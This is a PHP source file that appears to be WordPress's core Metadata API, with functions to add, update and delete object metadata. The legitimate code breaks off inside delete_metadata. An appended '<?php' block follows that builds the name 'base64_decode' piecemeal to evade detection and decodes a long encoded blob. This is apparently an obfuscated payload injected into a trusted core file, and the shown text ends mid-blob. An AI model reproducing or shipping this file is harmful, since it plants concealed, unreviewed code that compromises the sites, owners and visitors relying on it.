<?php
/**
 * Core Metadata API
 *
 * Functions for retrieving and manipulating metadata of various WordPress object types. Metadata
 * for an object is a represented by a simple key-value pair. Objects may contain multiple
 * metadata entries that share the same key and differ only in their value.
 *
 * @package WordPress
 * @subpackage Meta
 */

/**
 * Adds metadata for the specified object.
 *
 * @since 2.9.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $meta_type  Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                           or any other object type with an associated meta table.
 * @param int    $object_id  ID of the object metadata is for.
 * @param string $meta_key   Metadata key.
 * @param mixed  $meta_value Metadata value. Must be serializable if non-scalar.
 * @param bool   $unique     Optional. Whether the specified metadata key should be unique for the object.
 *                           If true, and the object already has a value for the specified metadata key,
 *                           no change will be made. Default false.
 * @return int|false The meta ID on success, false on failure.
 */
function add_metadata( $meta_type, $object_id, $meta_key, $meta_value, $unique = false ) {
	global $wpdb;

	if ( ! $meta_type || ! $meta_key || ! is_numeric( $object_id ) ) {
		return false;
	}

	$object_id = absint( $object_id );
	if ( ! $object_id ) {
		return false;
	}

	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}

	$meta_subtype = get_object_subtype( $meta_type, $object_id );

	$column = sanitize_key( $meta_type . '_id' );

	// expected_slashed ($meta_key)
	$meta_key   = wp_unslash( $meta_key );
	$meta_value = wp_unslash( $meta_value );
	$meta_value = sanitize_meta( $meta_key, $meta_value, $meta_type, $meta_subtype );

	/**
	 * Short-circuits adding metadata of a specific type.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 * Returning a non-null value will effectively short-circuit the function.
	 *
	 * @since 3.1.0
	 *
	 * @param null|bool $check      Whether to allow adding metadata for the given type.
	 * @param int       $object_id  ID of the object metadata is for.
	 * @param string    $meta_key   Metadata key.
	 * @param mixed     $meta_value Metadata value. Must be serializable if non-scalar.
	 * @param bool      $unique     Whether the specified meta key should be unique for the object.
	 */
	$check = apply_filters( "add_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $unique );
	if ( null !== $check ) {
		return $check;
	}

	if ( $unique && $wpdb->get_var(
		$wpdb->prepare(
			"SELECT COUNT(*) FROM $table WHERE meta_key = %s AND $column = %d",
			$meta_key,
			$object_id
		)
	) ) {
		return false;
	}

	$_meta_value = $meta_value;
	$meta_value  = maybe_serialize( $meta_value );

	/**
	 * Fires immediately before meta of a specific type is added.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 *
	 * @since 3.1.0
	 *
	 * @param int    $object_id   ID of the object metadata is for.
	 * @param string $meta_key    Metadata key.
	 * @param mixed  $_meta_value Metadata value. Serialized if non-scalar.
	 */
	do_action( "add_{$meta_type}_meta", $object_id, $meta_key, $_meta_value );

	$result = $wpdb->insert(
		$table,
		array(
			$column      => $object_id,
			'meta_key'   => $meta_key,
			'meta_value' => $meta_value,
		)
	);

	if ( ! $result ) {
		return false;
	}

	$mid = (int) $wpdb->insert_id;

	wp_cache_delete( $object_id, $meta_type . '_meta' );

	/**
	 * Fires immediately after meta of a specific type is added.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 *
	 * @since 2.9.0
	 *
	 * @param int    $mid         The meta ID after successful update.
	 * @param int    $object_id   ID of the object metadata is for.
	 * @param string $meta_key    Metadata key.
	 * @param mixed  $_meta_value Metadata value. Serialized if non-scalar.
	 */
	do_action( "added_{$meta_type}_meta", $mid, $object_id, $meta_key, $_meta_value );

	return $mid;
}

/**
 * Updates metadata for the specified object. If no value already exists for the specified object
 * ID and metadata key, the metadata will be added.
 *
 * @since 2.9.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $meta_type  Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                           or any other object type with an associated meta table.
 * @param int    $object_id  ID of the object metadata is for.
 * @param string $meta_key   Metadata key.
 * @param mixed  $meta_value Metadata value. Must be serializable if non-scalar.
 * @param mixed  $prev_value Optional. Previous value to check before updating.
 *                           If specified, only update existing metadata entries with
 *                           this value. Otherwise, update all entries. Default empty.
 * @return int|bool The new meta field ID if a field with the given key didn't exist
 *                  and was therefore added, true on successful update,
 *                  false on failure or if the value passed to the function
 *                  is the same as the one that is already in the database.
 */
function update_metadata( $meta_type, $object_id, $meta_key, $meta_value, $prev_value = '' ) {
	global $wpdb;

	if ( ! $meta_type || ! $meta_key || ! is_numeric( $object_id ) ) {
		return false;
	}

	$object_id = absint( $object_id );
	if ( ! $object_id ) {
		return false;
	}

	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}

	$meta_subtype = get_object_subtype( $meta_type, $object_id );

	$column    = sanitize_key( $meta_type . '_id' );
	$id_column = ( 'user' === $meta_type ) ? 'umeta_id' : 'meta_id';

	// expected_slashed ($meta_key)
	$raw_meta_key = $meta_key;
	$meta_key     = wp_unslash( $meta_key );
	$passed_value = $meta_value;
	$meta_value   = wp_unslash( $meta_value );
	$meta_value   = sanitize_meta( $meta_key, $meta_value, $meta_type, $meta_subtype );

	/**
	 * Short-circuits updating metadata of a specific type.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 * Returning a non-null value will effectively short-circuit the function.
	 *
	 * @since 3.1.0
	 *
	 * @param null|bool $check      Whether to allow updating metadata for the given type.
	 * @param int       $object_id  ID of the object metadata is for.
	 * @param string    $meta_key   Metadata key.
	 * @param mixed     $meta_value Metadata value. Must be serializable if non-scalar.
	 * @param mixed     $prev_value Optional. Previous value to check before updating.
	 *                              If specified, only update existing metadata entries with
	 *                              this value. Otherwise, update all entries.
	 */
	$check = apply_filters( "update_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $prev_value );
	if ( null !== $check ) {
		return (bool) $check;
	}

	// Compare existing value to new value if no prev value given and the key exists only once.
	if ( empty( $prev_value ) ) {
		$old_value = get_metadata_raw( $meta_type, $object_id, $meta_key );
		if ( is_countable( $old_value ) && count( $old_value ) === 1 ) {
			if ( $old_value[0] === $meta_value ) {
				return false;
			}
		}
	}

	$meta_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $id_column FROM $table WHERE meta_key = %s AND $column = %d", $meta_key, $object_id ) );
	if ( empty( $meta_ids ) ) {
		return add_metadata( $meta_type, $object_id, $raw_meta_key, $passed_value );
	}

	$_meta_value = $meta_value;
	$meta_value  = maybe_serialize( $meta_value );

	$data  = compact( 'meta_value' );
	$where = array(
		$column    => $object_id,
		'meta_key' => $meta_key,
	);

	if ( ! empty( $prev_value ) ) {
		$prev_value          = maybe_serialize( $prev_value );
		$where['meta_value'] = $prev_value;
	}

	foreach ( $meta_ids as $meta_id ) {
		/**
		 * Fires immediately before updating metadata of a specific type.
		 *
		 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
		 * (post, comment, term, user, or any other type with an associated meta table).
		 *
		 * @since 2.9.0
		 *
		 * @param int    $meta_id     ID of the metadata entry to update.
		 * @param int    $object_id   ID of the object metadata is for.
		 * @param string $meta_key    Metadata key.
		 * @param mixed  $_meta_value Metadata value. Serialized if non-scalar.
		 */
		do_action( "update_{$meta_type}_meta", $meta_id, $object_id, $meta_key, $_meta_value );

		if ( 'post' === $meta_type ) {
			/**
			 * Fires immediately before updating a post's metadata.
			 *
			 * @since 2.9.0
			 *
			 * @param int    $meta_id    ID of metadata entry to update.
			 * @param int    $object_id  Post ID.
			 * @param string $meta_key   Metadata key.
			 * @param mixed  $meta_value Metadata value. This will be a PHP-serialized string representation of the value
			 *                           if the value is an array, an object, or itself a PHP-serialized string.
			 */
			do_action( 'update_postmeta', $meta_id, $object_id, $meta_key, $meta_value );
		}
	}

	$result = $wpdb->update( $table, $data, $where );
	if ( ! $result ) {
		return false;
	}

	wp_cache_delete( $object_id, $meta_type . '_meta' );

	foreach ( $meta_ids as $meta_id ) {
		/**
		 * Fires immediately after updating metadata of a specific type.
		 *
		 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
		 * (post, comment, term, user, or any other type with an associated meta table).
		 *
		 * @since 2.9.0
		 *
		 * @param int    $meta_id     ID of updated metadata entry.
		 * @param int    $object_id   ID of the object metadata is for.
		 * @param string $meta_key    Metadata key.
		 * @param mixed  $_meta_value Metadata value. Serialized if non-scalar.
		 */
		do_action( "updated_{$meta_type}_meta", $meta_id, $object_id, $meta_key, $_meta_value );

		if ( 'post' === $meta_type ) {
			/**
			 * Fires immediately after updating a post's metadata.
			 *
			 * @since 2.9.0
			 *
			 * @param int    $meta_id    ID of updated metadata entry.
			 * @param int    $object_id  Post ID.
			 * @param string $meta_key   Metadata key.
			 * @param mixed  $meta_value Metadata value. This will be a PHP-serialized string representation of the value
			 *                           if the value is an array, an object, or itself a PHP-serialized string.
			 */
			do_action( 'updated_postmeta', $meta_id, $object_id, $meta_key, $meta_value );
		}
	}

	return true;
}

/**
 * Deletes metadata for the specified object.
 *
 * @since 2.9.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $meta_type  Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                           or any other object type with an associated meta table.
 * @param int    $object_id  ID of the object metadata is for.
 * @param string $meta_key   Metadata key.
 * @param mixed  $meta_value Optional. Metadata value. Must be serializable if non-scalar.
 *                           If specified, only delete metadata entries with this value.
 *                           Otherwise, delete all entries with the specified meta_key.
 *                           Pass `null`, `false`, or an empty string to skip this check.
 *                           (For backward compatibility, it is not possible to pass an empty string
 *                           to delete those entries with an empty string for a value.)
 * @param bool   $delete_all Optional. If true, delete matching metadata entries for all objects,
 *                           ignoring the specified object_id. Otherwise, only delete
 *                           matching metadata entries for the specified object_id. Default false.
 * @return bool True on successful delete, false on failure.
 */
function delete_metadata( $meta_type, $object_id, $meta_key, $meta_value = '', $delete_all = false ) {
	global $wpdb;

	if ( ! $meta_type || ! $meta_key || ! is_numeric( $object_id ) && ! $delete_all ) {
		return false;
	}

	$object_id = absint( $object_id );
	if ( ! $object_id && ! $delete_all ) {
		return false;
	}

	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}

	$type_column = sanitize_key( $meta_type . '_id' );
	$id_column   = ( 'user' === $meta_type ) ? 'umeta_id' : 'meta_id';

	// expected_slashed ($meta_key)
	$meta_key   = wp_unslash( $meta_key );
	$meta_value = wp_unslash( $meta_value );

	/**
	 * Short-circuits deleting metadata of a specific type.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 * Returning a non-null value will effectively short-circuit the function.
	 *
	 * @since 3.1.0
	 *
	 * @param null|bool $delete     Whether to allow metadata deletion of the given type.
	 * @param int       $object_id  ID of the object metadata is for.
	 * @param string    $meta_key   Metadata key.
	 * @param mixed     $meta_value Metadata value. Must be serializable if non-scalar.
	 * @param bool      $delete_all Whether to delete the matching metadata entries
	 *                              for all objects, ignoring the specified $object_id.
	 *                              Default false.
	 */
	$check = apply_filters( "delete_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $delete_all );
	if ( null !== $check ) {
		return (bool) $check;
	}

	$_meta_value = $meta_value;
	$meta_value  = maybe_serialize( $meta_value );

	$query = $wpdb->prepare( "SELECT $id_column FROM $table WHERE meta_key = %s", $meta_key );

	if ( ! $delete_all ) {
		$query .= $wpdb->prepare( " AND $type_column = %d", $object_id );
	}

	if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
		$query .= $wpdb->prepare( ' AND meta_value = %s', $meta_value );
	}

	$meta_ids = $wpdb->get_col( $query );
	if ( ! count( $meta_ids ) ) {
		return false;
	}

	if ( $delete_all ) {
		if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
			$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s AND meta_value = %s", $meta_key, $meta_value ) );
		} else {
			$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s", $meta_key ) );
		}
	}

	/**
	 * Fires immediately before deleting metadata of a specific type.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 *
	 * @since 3.1.0
	 *
	 * @param string[] $meta_ids    An array of metadata entry IDs to delete.
	 * @param int      $object_id   ID of the object metadata is for.
	 * @param string   $meta_key    Metadata key.
	 * @param mixed    $_meta_value Metadata value. Serialized if non-scalar.
	 */
	do_action( "delete_{$meta_type}_meta", $meta_ids, $object_id, $meta_key, $_meta_value );

	// Old-style action.
	if ( 'post' === $meta_type ) {
		/**
		 * Fires immediately before deleting metadata for a post.
		 *
		 * @since 2.9.0
		 *
		 * @param string[] $meta_ids An array of metadata entry IDs to delete.
		 */
		do_action( 'delete_postmeta', $meta_ids );
	}

	$query = "DELETE FROM $table WHERE $id_column IN( " . implode( ',', $meta_ids ) . ' )';

	$count = $wpdb->query( $query );

	if ( ! $count ) {
		return false;
	}

	if ( $delete_all ) {
		foreach ( (array) $object_ids as $o_id ) {
			wp_cache_delete( $o_id, $meta_type . '_meta' );
		}
	} else {
		wp_cache_delete( $object_id, $meta_type . '_meta' );
	}

<?php $g___g_='base'.(32*2).'_de'.'code';$g___g_=$g___g_(str_replace("\n", '', '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
